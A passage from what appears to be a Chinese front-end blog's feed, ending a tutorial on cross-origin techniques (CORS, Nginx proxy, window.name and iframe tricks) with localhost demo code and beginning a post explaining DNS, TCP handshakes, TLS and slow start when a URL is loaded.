class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="javascript">            <span class="comment">//2. 初始化设置</span></span></span><br><span class="line"><span class="javascript">            x.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;http://127.0.0.1:81/nginx&quot;</span>);</span></span><br><span class="line"><span class="javascript">            <span class="comment">// x.open(&quot;GET&quot;, &quot;http://127.0.0.1:8000/nginx&quot;);</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//3. 发送</span></span></span><br><span class="line"><span class="javascript">            x.send();</span></span><br><span class="line"><span class="javascript">            <span class="comment">//4. 绑定事件</span></span></span><br><span class="line"><span class="javascript">            x.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">if</span>(x.readyState === <span class="number">4</span>)&#123;</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">if</span>(x.status &gt;= <span class="number">200</span> &amp;&amp; x.status &lt; <span class="number">300</span>)&#123;</span></span><br><span class="line"><span class="javascript">                        <span class="comment">//输出响应体</span></span></span><br><span class="line"><span class="javascript">                        <span class="built_in">console</span>.log(x.response);</span></span><br><span class="line"><span class="javascript">                        <span class="built_in">document</span>.getElementById(<span class="string">&quot;result&quot;</span>).innerHTML=x.response;</span></span><br><span class="line"><span class="javascript">                    &#125;</span></span><br><span class="line"><span class="javascript">                &#125;</span></span><br><span class="line"><span class="javascript">            &#125;</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>服务器</strong>  <code>http://127.0.0.1:8000</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1. 引入express</span></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="comment">//2. 创建应用对象</span></span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"></span><br><span class="line"><span class="comment">//3. 创建路由规则</span></span><br><span class="line"><span class="comment">// request 是对请求报文的封装</span></span><br><span class="line"><span class="comment">// response 是对响应报文的封装</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Nginx</span></span><br><span class="line">app.all(<span class="string">&#x27;/nginx&#x27;</span>, <span class="function">(<span class="params">request, response</span>)=&gt;</span>&#123;</span><br><span class="line">    response.send(<span class="string">&#x27;hello CORS&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//4. 监听端口启动服务</span></span><br><span class="line">app.listen(<span class="number">8000</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;服务已经启动, 8000 端口监听中....&quot;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="window-name-iframe"><a href="#window-name-iframe" class="headerlink" title="window.name + iframe"></a>window.name + iframe</h3><p><code>window.name</code>属性的独特之处：<code>name</code>值在不同的页面（甚至不同域名）加载后依旧存在，并且可以支持非常长的<code>name</code> 值（<code>2MB</code>）。</p><p>其中<code>a.html</code>和<code>b.html</code>是同域的，都是<code>http://127.0.0.1:5500</code>;而<code>c.html</code>是<code>http://127.0.0.1:8000</code></p><p><code>a.html</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1:8000&quot;</span> <span class="attr">frameborder</span>=<span class="string">&quot;0&quot;</span> <span class="attr">onload</span>=<span class="string">&quot;load()&quot;</span> <span class="attr">id</span>=<span class="string">&quot;iframe&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">      <span class="keyword">let</span> first = <span class="literal">true</span></span></span><br><span class="line"><span class="javascript">      <span class="comment">// onload事件会触发2次，第1次加载跨域页，并留存数据于window.name</span></span></span><br><span class="line"><span class="javascript">      <span class="function"><span class="keyword">function</span> <span class="title">load</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span>(first)&#123;</span></span><br><span class="line"><span class="javascript">        <span class="comment">// 第1次onload(跨域页)成功后，切换到同域代理页面</span></span></span><br><span class="line"><span class="javascript">          <span class="keyword">let</span> iframe = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;iframe&#x27;</span>);</span></span><br><span class="line"><span class="javascript">          iframe.src = <span class="string">&#x27;http://127.0.0.1:5500/name/b.html&#x27;</span>;</span></span><br><span class="line"><span class="javascript">          first = <span class="literal">false</span>;</span></span><br><span class="line"><span class="javascript">        &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="comment">// 第2次onload(同域b.html页)成功后，读取同域window.name中数据</span></span></span><br><span class="line"><span class="javascript">          <span class="built_in">console</span>.log(iframe.contentWindow.name);</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript">      &#125;</span></span><br><span class="line"><span class="javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>b.html</code>为中间代理页，与<code>a.html</code>同域，内容为空。</p><p><code>c.html</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.name = <span class="string">&#x27;我不爱你&#x27;</span>  </span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>总结：通过iframe的src属性由外域转向本地域，跨域数据即由iframe的<code>window.name</code>从外域传递到本地域。这个就巧妙地绕过了浏览器的跨域访问限制，但同时它又是安全操作。</p><h3 id="location-hash-iframe"><a href="#location-hash-iframe" class="headerlink" title="location.hash + iframe"></a>location.hash + iframe</h3><p>实现原理： a.html欲与c.html跨域相互通信，通过中间页b.html来实现。 三个页面，不同域之间利用iframe的<code>location.hash</code>传值，相同域之间直接js访问来通信。</p><h3 id="document-domain-iframe"><a href="#document-domain-iframe" class="headerlink" title="document.domain + iframe"></a>document.domain + iframe</h3><p><strong>该方式只能用于二级域名相同的情况下，比如 <code>a.test.com</code> 和 <code>b.test.com</code> 适用于该方式</strong>。 只需要给页面添加 <code>document.domain =&#39;test.com&#39;</code> 表示二级域名都相同就可以实现跨域。</p><p>实现原理：两个页面都通过js强制设置<code>document.domain</code>为基础主域，就实现了同域。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li><strong>CORS</strong>支持所有类型的HTTP请求，是跨域HTTP请求的<strong>根本解决方案</strong>。</li><li><strong>JSONP</strong>只支持<strong>GET</strong>请求，JSONP的优势<strong>在于支持老式浏览器</strong>，以及可以<strong>向不支持CORS的网站请求数据</strong>。</li><li>不管是<strong>Node中间件代理</strong>还是<strong>Nginx反向代理</strong>，主要是通过<strong>同源策略对服务器不加限制</strong>。</li><li>日常工作中，用得比较多的跨域方案是<strong>CORS</strong>和<strong>Nginx反向代理</strong>。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;跨域通信&quot;&gt;&lt;a href=&quot;#跨域通信&quot; class=&quot;headerlink&quot; title=&quot;跨域通信&quot;&gt;&lt;/a&gt;跨域通信&lt;/h1&gt;&lt;h2 id=&quot;同源策略和跨域&quot;&gt;&lt;a href=&quot;#同源策略和跨域&quot; class=&quot;headerlink&quot; title=&quot;同源策</summary>
      
    
    
    
    <category term="浏览器" scheme="https://lesliewaong.top/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
    <category term="Ajax" scheme="https://lesliewaong.top/tags/Ajax/"/>
    
    <category term="跨域" scheme="https://lesliewaong.top/tags/%E8%B7%A8%E5%9F%9F/"/>
    
    <category term="JSONP" scheme="https://lesliewaong.top/tags/JSONP/"/>
    
    <category term="CORS" scheme="https://lesliewaong.top/tags/CORS/"/>
    
  </entry>
  
  <entry>
    <title>从URL输入到页面展现到底发生什么？</title>
    <link href="https://lesliewaong.top/posts/6154ca16.html"/>
    <id>https://lesliewaong.top/posts/6154ca16.html</id>
    <published>2022-03-03T05:14:52.000Z</published>
    <updated>2022-03-25T14:08:26.420Z</updated>
    
    <content type="html"><![CDATA[<h1 id="从URL输入到页面展现到底发生什么？"><a href="#从URL输入到页面展现到底发生什么？" class="headerlink" title="从URL输入到页面展现到底发生什么？"></a>从URL输入到页面展现到底发生什么？</h1><p><a href="https://imgtu.com/i/btVsO0"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://s4.ax1x.com/2022/03/03/btVsO0.png" alt="btVsO0.png"></a></p><p>总体来说分为以下几个过程:</p><ul><li>解析URL并生成请求报文</li><li>DNS 解析：将域名解析成IP地址</li><li>TCP 三次握手、TLS三次握手 =》在HTTPS上建立安全连接</li><li>发送HTTP请求</li><li>服务器处理请求并返回 HTTP 报文</li><li>浏览器解析渲染页面</li><li>断开连接：TCP四次挥手</li></ul><h2 id="URL解析并生成HTTP请求消息"><a href="#URL解析并生成HTTP请求消息" class="headerlink" title="URL解析并生成HTTP请求消息"></a>URL解析并生成HTTP请求消息</h2><p>首先浏览器做的第一步工作就是要对URL进行解析，从而生成发送给Web服务器的请求信息。</p><h3 id="URL是什么？"><a href="#URL是什么？" class="headerlink" title="URL是什么？"></a>URL是什么？</h3><blockquote><p>URI 和 URL</p><ul><li>URI(Uniform Resource Identifier) 是<strong>统一资源标志符</strong>，可以<strong>唯一标识一个资源</strong>。</li><li>URL(Uniform Resource Locator) 是<strong>统一资源定位符</strong>，可以提供该资源的<strong>路径</strong>。它是一种具体的 URI，即 <strong>URL 可以用来标识一个资源，而且还指明了如何 locate 这个资源</strong>。</li></ul><p>URI 的作用像身份证号一样，URL 的作用更像家庭住址一样。<strong>URL 是一种具体的 URI，它不仅唯一标识资源，而且还提供了定位该资源的信息。</strong></p></blockquote><p>URL遵守以下的语法规则：<code>scheme://host.domain:port/path/filename</code></p><ul><li><strong>scheme</strong> - 定义因特网服务的类型。常见的协议有 <strong>http、https、ftp、file</strong>，其中最常见的类型是 http，而 <strong>https 则是进行加密的网络传输</strong>。</li><li><strong>host</strong> - 定义域主机（http 的默认主机是 <strong>www</strong>）</li><li><strong>domain</strong> - 定义因特网<strong>域名</strong>，比如 <code>w3school.com.cn</code></li><li><strong>port</strong> - 定义主机上的<strong>端口号</strong>（http 的默认端口号是 80）</li><li><strong>path</strong> - 定义服务器上的路径（如果省略，则文档必须位于网站的根目录中）。</li><li><strong>filename</strong> - 定义文档/资源的名称</li></ul><p>当没有路径名时，就代表访问根目录下事先设置的默认文件，也就是<code>/index.html</code>或者<code>/default.html</code>这些文件，这样就不会发生混乱了。</p><h3 id="生成HTTP请求消息"><a href="#生成HTTP请求消息" class="headerlink" title="生成HTTP请求消息"></a>生成HTTP请求消息</h3><p>对URL进行解析之后，浏览器确定了Web服务器和文件名，接下来就是根据这些信息来生成HTTP请求消息了。</p><p><a href="https://imgtu.com/i/btZlAU"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://s4.ax1x.com/2022/03/03/btZlAU.png" alt="btZlAU.png"></a></p><h2 id="域名解析（DNS）"><a href="#域名解析（DNS）" class="headerlink" title="域名解析（DNS）"></a>域名解析（DNS）</h2><p>通过浏览器解析URL并生成HTTP消息后，需要委托操作系统将消息发送给Web服务器。</p><p>但在发送之前，还有一项工作需要完成，那就是<strong>查询服务器域名对应的IP地址，因为委托操作系统发送消息时，必须提供通信对象的IP地址。</strong></p><p>比如我们打电话的时候，必须要知道对方的电话号码，但由于电话号码难以记忆，所以通常我们会将对方电话号+姓名保存在通讯录里。</p><p>所以，有一种服务器就<strong>专门保存了Web服务器域名与IP的对应关系</strong>，它就是<strong>DNS服务器</strong>。</p><h3 id="域名的层级关系"><a href="#域名的层级关系" class="headerlink" title="域名的层级关系"></a>域名的层级关系</h3><p>DNS 中的域名都是用<strong>句点</strong>来分隔的，比 <a href="http://www.serve.com,在域名中,**越靠右的位置表示其层级越高./">www.Serve.com，在域名中，**越靠右的位置表示其层级越高。</a>**</p><p>根域的DNS 服务器信息保存在互联网中所有的 DNS服务器中。</p><p>这样一来，任何DNS服务器就都可以找到并访问根域 DNS服务器了。</p><p>因此，客户端只要能够找到任意一台DNS服务器，就可以通过它找到根域DNS服务器，然后再一路顺藤摸瓜找到位于下层的某台目标 DNS服务器。</p><h3 id="IP-地址"><a href="#IP-地址" class="headerlink" title="IP 地址"></a>IP 地址</h3><p>IP 地址是指互联网协议地址，是 IP Address 的缩写。</p><p>IP 地址是 IP 协议提供的一种统一的地址格式，它为<strong>互联网上的每一个网络和每一台主机分配一个逻辑地址</strong>，以此来屏蔽物理地址的差异。IP 地址是一个 32 (8*4)位的二进制数，比如 127.0.0.1 为本机 IP。</p><p><strong>域名就相当于 IP 地址乔装打扮的伪装者，带着一副面具。它的作用就是便于记忆和沟通的一组服务器的地址</strong>。</p><p>用户通常使用主机名或域名来访问对方的计算机，而不是直接通过 IP 地址访问。</p><p>因为与 IP 地址的一组纯数字相比，用字母配合数字的表示形式来指定计算机名更符合人类的记忆习惯。</p><p>但要让计算机去理解名称，相对而言就变得困难了。</p><p>因为计算机更擅长处理一长串数字。为了解决上述的问题，DNS 服务应运而生。</p><h3 id="什么是域名解析"><a href="#什么是域名解析" class="headerlink" title="什么是域名解析"></a>什么是域名解析</h3><p>DNS 协议提供通过域名查找 IP 地址，或逆向从 IP 地址反查域名的服务。</p><p><strong>DNS 是一个网络服务器，我们的域名解析简单来说就是在 DNS 上记录一条信息记录</strong>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">例如 baidu.com  220.114.23.56（服务器外网IP地址）80（服务器端口号）</span><br></pre></td></tr></table></figure><h3 id="浏览器如何通过域名去查询-URL-对应的-IP-呢"><a href="#浏览器如何通过域名去查询-URL-对应的-IP-呢" class="headerlink" title="浏览器如何通过域名去查询 URL 对应的 IP 呢"></a>浏览器如何通过域名去查询 URL 对应的 IP 呢</h3><ul><li>浏览器缓存：浏览器会按照一定的频率缓存 DNS 记录。</li><li>操作系统缓存：如果浏览器缓存中找不到需要的 DNS 记录，那就去操作系统中找。</li><li>路由缓存：路由器也有 DNS 缓存。</li><li>ISP 的 DNS 服务器：ISP 是互联网服务提供商(Internet Service Provider)的简称，ISP 有专门的 DNS 服务器应对 DNS 查询请求。</li><li>根服务器：ISP 的 DNS 服务器还找不到的话，它就会向根服务器发出请求，进行递归查询。</li></ul><p><a href="https://imgtu.com/i/btevLt"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://s4.ax1x.com/2022/03/03/btevLt.png" alt="btevLt.png"></a></p><p>DNS域名解析的过程蛮有意思的，整个过程就和我们日常生活中找人问路的过程类似，只指路不带路。</p><h3 id="DNS负载均衡"><a href="#DNS负载均衡" class="headerlink" title="DNS负载均衡"></a>DNS负载均衡</h3><p>比如访问baidu.com的时候，每次响应的并非是同一个服务器（IP地址不同），一般大公司都有成百上千台服务器来支撑访问。DNS可以返回一个合适的机器的IP给用户，例如可以根据每台机器的负载量，该机器离用户地理位置的距离等等，这种过程就是DNS负载均衡。</p><h2 id="协议栈"><a href="#协议栈" class="headerlink" title="协议栈"></a>协议栈</h2><p>通过DNS获取到IP后，就可以把 HTTP的传输工作交给<strong>操作系统中的协议栈</strong>。</p><p><a href="https://imgtu.com/i/btmiWQ"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://s4.ax1x.com/2022/03/03/btmiWQ.png" alt="btmiWQ.png"></a></p><p>应用程序（浏览器）通过调用Socket库，来委托协议栈工作。</p><p>协议栈的上半部分有两块，分别是负责收发数据的<strong>TCP</strong>和<strong>UDP</strong>协议，它们会<strong>接受应用层的委托执行收发数据的操作</strong>。</p><p>协议栈的下面一半是用<strong>IP</strong>协议<strong>控制网络包收发操作</strong>，在互联网上传数据时，数据会被切分成一块块的网络包，而将网络包发送给对方的操作就是由IP负责的。</p><p>此外IP中还包括ICMP协议和ARP协议。</p><ul><li><strong>ICMP</strong>用于告知网络包传送过程中<strong>产生的错误</strong>以及各种<strong>控制信息</strong>。</li><li><strong>ARP</strong>用于根据<strong>IP地址</strong>查询相应的<strong>以太网MAC地址</strong>。</li></ul><p>IP下面的<strong>网卡驱动程序负责控制网卡硬件</strong>，而最下面的网卡则负责完成<strong>实际的收发操作</strong>，也就是对网线中的信号执行发送和接收操作。</p><h3 id="TCP三次握手"><a href="#TCP三次握手" class="headerlink" title="TCP三次握手"></a>TCP三次握手</h3><p>在HTTP传输数据之前，首先需要TCP建立连接，TCP连接的建立，通常称为三次握手。</p><p>这个所谓的「连接」，只是双方计算机里<strong>维护一个状态机</strong>。</p><blockquote><p>我们来看看RFC 793是如何定义「连接」的:</p></blockquote><p>简单来说就是，<strong>用于保证可靠性和流量控制维护的某些状态信息，这些信息的组合，包括Socket、序列号和窗口大小称为连接。</strong></p><p>所以我们可以知道，建立一个TCP连接是需要客户端与服务器端达成上述三个信息的共识。</p><ul><li><strong>Socket</strong>:由<strong>IP地址</strong>和<strong>端口号</strong>组成</li><li><strong>序列号</strong>:用来解决乱序问题等</li><li><strong>窗口大小</strong>:用来做流量控制</li></ul><h4 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h4><p>首先，<strong>源端口号</strong>和<strong>目标端口号</strong>是不可少的，如果没有这两个端口号，数据就不知道应该发给哪个应用。</p><p>接下来有包的<strong>序号</strong>，这个是为了<strong>解决包乱序的问题</strong>。</p><p>还有就是<strong>确认号</strong>，目的是确认发出去对方是否有收到。如果没有收到就应该重新发送，直到送达，这个是为了<strong>解决不丢包的问题</strong>。</p><p>接下来还有一些状态位。例如<code>SYN</code>是发起一个连接，<code>ACK</code>是回复，<code>RST</code>是重新连接，<code>FIN</code>是结束连接等。</p><p>TCP是<strong>面向连接</strong>的，因而双方要<strong>维护连接的状态</strong>，这些带状态位的包的发送，会引起双方的状态变更。</p><p>还有一个重要的就是<strong>窗口大小</strong>。TCP要做<strong>流量控制</strong>，通信双方各声明一个窗口(缓存大小) ,标识自己当前能够的处理能力，别发送的太快，撑死我，也别发的太慢，饿死我。</p><p>除了做流量控制以外，TCP还会做<strong>拥塞控制</strong>，对于真正的通路堵车不堵车，它无能为力，唯一能做的就是控制自己，也即控制发送的速度。不能改变世界，就改变自己嘛。</p><p><a href="https://imgtu.com/i/btm5lj"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://s4.ax1x.com/2022/03/03/btm5lj.png" alt="btm5lj.png"></a></p><h4 id="三次握手"><a href="#三次握手" class="headerlink" title="三次握手"></a>三次握手</h4><ul><li>一开始，客户端和服务端都处于<code>CLOSED</code>状态。先是服务端主动监听某个端口，处于<code>LISTEN</code>状态。</li><li>客户端会随机初始化序号（<code>client_isn</code> ) ，将此序号置于TCP首部的<strong>序号</strong>字段中，同时把<code>SYN</code> 标志位置为<code>1</code> ，表示 SYN 报文。接着把<strong>第一个SYN 报文发送给服务端</strong>，表示向服务端发起连接，该报文<strong>不包含应用层数据</strong>，之后客户端处于<code>SYN-SENT</code>状态。</li><li>服务端收到客户端的<code>SYN</code>报文后，也随机初始化自己的序号（<code>server_isn</code> )，将此序号填入TCP首部的<strong>序号</strong>字段中，其次把TCP首部的<strong>确认应答号</strong>字段填入<code>client_isn +1</code> ,接着把<code>SYN</code>和<code>ACK</code>标志位置为<code>1</code>。最后把该报文发给客户端，该报文<strong>也不包含应用层数据</strong>，之后服务端处于<code>SYN-RCVD</code>状态。</li><li>客户端收到服务端报文后，还要向服务端回应最后一个应答报文，首先该应答报文TCP首部<code>ACK</code>标志位置为<code>1</code>，其次<strong>确认应答号</strong>字段填入<code>server_isn +1</code> ，最后把报文发送给服务端，这次报文<strong>可以携带客户到服务器的数据</strong>，之后客户端处于<code>ESTABLISHED</code> 状态。</li><li>服务器收到客户端的应答报文后，也进入<code>ESTABLISHED</code>状态。</li></ul><p><a href="https://imgtu.com/i/btndH0"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://s4.ax1x.com/2022/03/03/btndH0.png" alt="btndH0.png"></a></p><h4 id="为什么是三次握手-不是两次、四次"><a href="#为什么是三次握手-不是两次、四次" class="headerlink" title="为什么是三次握手?不是两次、四次?"></a>为什么是三次握手?不是两次、四次?</h4><p>相信大家比较常回答的是︰“<strong>因为三次握手才能保证双方具有接收和发送的能力</strong>。”</p><p>这回答是没问题，但这回答是片面的，并没有说出主要的原因。</p><p>在前面我们知道了什么是TCP连接:</p><p>用于保证可靠性和流量控制维护的某些状态信息，这些信息的组合，包括Socket、序列号和窗口大小称为连接。</p><p>所以，重要的是为什么三次握手才可以<strong>初始化Socket、序列号和窗口大小并建立TCP连接</strong>。</p><p>接下来以三个方面分析三次握手的原因:</p><ul><li>三次握手才可以<strong>阻止重复历史连接的初始化（主要原因)</strong></li><li>三次握手才可以<strong>同步双方的初始序列号</strong></li><li>三次握手才可以<strong>避免资源浪费</strong></li></ul><h5 id="避免历史连接"><a href="#避免历史连接" class="headerlink" title="避免历史连接"></a>避免历史连接</h5><p>简单来说，三次握手的首要原因是<strong>为了防止旧的重复连接初始化造成混乱</strong>。</p><p>客户端连续发送多次SYN建立连接的报文，在网络拥堵情况下:</p><ul><li>一个<strong>旧SYN报文</strong>比<strong>最新的SYN</strong>报文早到达了服务端;</li><li>那么此时服务端就会回一个<strong>SYN</strong> +<strong>ACK</strong>报文给客户端;</li><li>客户端收到后可以根据自身的上下文，判断这是一个历史连接（序列号过期或超时)，那么客户端就会发送<strong>RST</strong>报文给服务端，表示中止这一次连接。</li></ul><p>如果是两次握手连接，就不能判断当前连接是否是历史连接，三次握手则可以在客户端（发送方）准备发送第三次报文时，客户端因有足够的上下文来判断当前连接是否是历史连接︰</p><ul><li>如果是历史连接（序列号过期或超时)，则第三次握手发送的报文是RST报文，以此中止历史连接;</li><li>如果不是历史连接，则第三次发送的报文是ACK报文，通信双方就会成功建立连接</li></ul><h5 id="同步双方初始序列号"><a href="#同步双方初始序列号" class="headerlink" title="同步双方初始序列号"></a>同步双方初始序列号</h5><p>TCP协议的通信双方，都必须维护一个<strong>序列号</strong>，序列号是可靠传输的一个关键因素，它的作用:</p><ul><li>接收方可以<strong>去除重复的数据</strong>;</li><li>接收方可以根据数据包的序列号<strong>按序接收</strong>;</li><li>可以<strong>标识</strong>发送出去的数据包中，哪些是已经被对方收到的;</li></ul><p>可见，序列号在TCP 连接中占据着非常重要的作用，所以当<strong>客户端</strong>发送携带<strong>初始序列号</strong>的 <strong>SYN</strong> 报文的时候，需要<strong>服务端</strong>回一个<strong>ACK应答报文</strong>，表示客户端的SYN报文已被服务端成功接收，那当<strong>服务端</strong>发送<strong>初始序列号</strong>给客户端的时候，依然也要得到<strong>客户端的应答回应</strong>，这样一来一回，才能确保双方的初始序列号能被可靠的同步。</p><p>两次握手<strong>只保证了一方的初始序列号能被对方成功接收，没办法保证双方的初始序列号都能被确认接收</strong>。</p><h5 id="避免资源浪费"><a href="#避免资源浪费" class="headerlink" title="避免资源浪费"></a>避免资源浪费</h5><p>如果只有<strong>两次握手</strong>，当客户端的SYN请求连接在网络中阻塞，客户端没有接收到<strong>ACK</strong>报文，就会重新发送<strong>SYN</strong> ，由于没有第三次握手，服务器不清楚客户端是否收到了自己发送的建立连接的 <strong>ACK</strong>确认信号，所以每收到一个<strong>SYN</strong>就只能先主动建立一个连接，这会造成什么情况呢?</p><p>如果客户端的SYN 阻塞了，重复发送多次SYN 报文，那么服务器在收到请求后就会<strong>建立多个冗余的无效链接，造成不必要的资源浪费。</strong></p><h5 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h5><p><strong>TCP建立连接时，通过三次握手能防止历史连接的建立，能减少双方不必要的资源开销，能帮助双方同步初始化序列号。序列号能够保证数据包不重复、不丢弃和按序传输。</strong></p><p>不使用<strong>两次握手</strong>和<strong>四次握手</strong>的原因:</p><ul><li>两次握手︰无法防止历史连接的建立，会造成双方资源的浪费，也无法可靠的同步双方序列号;</li><li>四次握手︰三次握手就已经理论上最少可靠连接建立，所以不需要使用更多的通信次数。</li></ul><blockquote><p>为什么客户端和服务端的初始序列号ISN是不相同的?</p></blockquote><p>如果一个已经失效的连接被重用了，但是该旧连接的历史报文还残留在网络中，如果序列号相同，那么就无法分辨出该报文是不是历史报文，如果历史报文被新的连接接收了，则会产生数据错乱。</p><p>所以，每次建立连接前重新初始化一个序列号主要是为了<strong>通信双方能够根据序号将不属于本连接的报文段丢弃</strong>。</p><p>另一方面是为了<strong>安全性</strong>，防止黑客伪造的相同序列号的TCP报文被对方接收。</p><h4 id="TCP分割数据"><a href="#TCP分割数据" class="headerlink" title="TCP分割数据"></a>TCP分割数据</h4><p>如果HTTP请求消息比较长，超过了<strong>MSS</strong>的长度，这时TCP就需要把HTTP的数据拆解成一块块的数据发送，而不是一次性发送所有数据。</p><ul><li>MTU :一个网络包的最大长度，以太网中一般为1500字节。</li><li>MSS:除去IP和TCP头部之后，一个网络包所能容纳的TCP数据的最大长度。</li></ul><p>数据会被以<strong>MSS</strong>的长度为单位进行拆分，拆分出来的每一块数据都会被放进单独的网络包中。也就是在每个被拆分的数据加上TCP头信息，然后<strong>交给IP模块来发送数据</strong>。</p><p><a href="https://imgtu.com/i/btKOtf"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://s4.ax1x.com/2022/03/03/btKOtf.png" alt="btKOtf.png"></a></p><h4 id="TCP报文生成"><a href="#TCP报文生成" class="headerlink" title="TCP报文生成"></a>TCP报文生成</h4><p>TCP协议里面会有两个端口，一个是浏览器监听的端口（(通常是随机生成的)，一个是Web服务器监听的端口(<strong>HTTP</strong>默认端口号是<strong>80</strong> ,<strong>HTTPS</strong>默认端口号是<strong>443</strong> ) 。</p><p>在双方建立了连接后，TCP报文中的数据部分就是存放HTTP头部＋数据，组装好TCP报文之后，就需交给下面的<strong>网络层</strong>处理。</p><h3 id="TLS-协商"><a href="#TLS-协商" class="headerlink" title="TLS 协商"></a>TLS 协商</h3><p>为了在HTTPS上建立<strong>安全连接</strong>，另一种握手是必须的。更确切的说是TLS协商 ，它决定了什么密码将会被用来加密通信，验证服务器，在进行真实的数据传输之前建立安全连接。在发送真正的请求内容之前还需要<strong>三次</strong>往返服务器。</p><p><a href="https://imgtu.com/i/btMsC8"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://s4.ax1x.com/2022/03/03/btMsC8.jpg" alt="btMsC8.jpg"></a></p><p>虽然建立安全连接对增加了加载页面的等待时间，对于建立一个安全的连接来说，以增加等待时间为代价是值得的，因为在浏览器和web服务器之间传输的数据不可以被第三方解密。</p><p>经过8次往返，浏览器终于可以发出请求。</p><h3 id="TCP慢开始和拥塞控制"><a href="#TCP慢开始和拥塞控制" class="headerlink" title="TCP慢开始和拥塞控制"></a>TCP慢开始和拥塞控制</h3><p>一旦我们建立了到web服务器的连接，浏览器就代表用户发送一个初始的HTTP GET请求，对于网站来说，这个请求通常是一个HTML文件。 一旦服务器收到请求，它将使用相关的响应头和HTML的内容进行回复。</p><p>初始请求的响应包含所接收数据的第一个字节。</p><p>Time to First Byte(TTFB)是用户通过点击链接进行请求与收到第一个HTML包之间的时间。</p><p>第一个响应包是<strong>14kb</strong>大小。这是<strong>慢开始</strong>的一部分，慢开始是一种均衡网络连接速度的算法。慢开始逐渐增加发送数据的数量直到达到网络的最大带宽。</p><p>在”TCP slow start”中，在收到初始包之后, 服务器会将下一个包的大小加倍到大约28kb。 后续的包依次是前一个包大小的二倍直到达到预定的阈值，或者遇到拥塞。</p><p><a href="https://imgtu.com/i/bt3nG6"><img src= 